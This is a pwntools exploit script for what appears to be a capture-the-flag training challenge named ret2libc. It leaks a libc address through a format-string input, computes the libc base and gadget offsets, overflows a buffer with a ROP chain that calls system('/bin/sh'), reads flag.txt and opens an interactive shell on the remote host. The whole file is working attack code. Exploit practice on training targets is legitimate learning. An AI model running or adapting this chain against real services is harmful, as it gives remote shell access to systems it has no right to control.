#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'

p = remote('pwn-ret2libc.training.bksec.vn', 8443, ssl = True)
# p = process('./bof')
exe = ELF('./libc.so.6', checksec = False)

# p.sendlineafter(b"Enter your name: ", b'%29$p')
p.sendlineafter(b"Enter your name: ", b'%49$p')
p.recvuntil(b'0x')
leak_libc_start_call_main_7a = '0x' + p.recv(12).decode()
print(leak_libc_start_call_main_7a)


# offset = exe.symbols['__libc_start_call_main'] +0x80
offset = exe.symbols['__libc_start_main'] +128

lib_base = int(leak_libc_start_call_main_7a, 16) - offset
func_system = lib_base + 0x0000000000050d70
bin_sh = lib_base + 0x1d8678
pop_rdi = lib_base + 0x000000000002a3e5 #pop rdi; ret
ret = pop_rdi + 1


payload = b'A'*0x78
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(func_system)

p.sendlineafter(b"Input your string: ", payload)
p.sendline(b'cat flag.txt')
leak = p.recv()
print(leak)
p.interactive()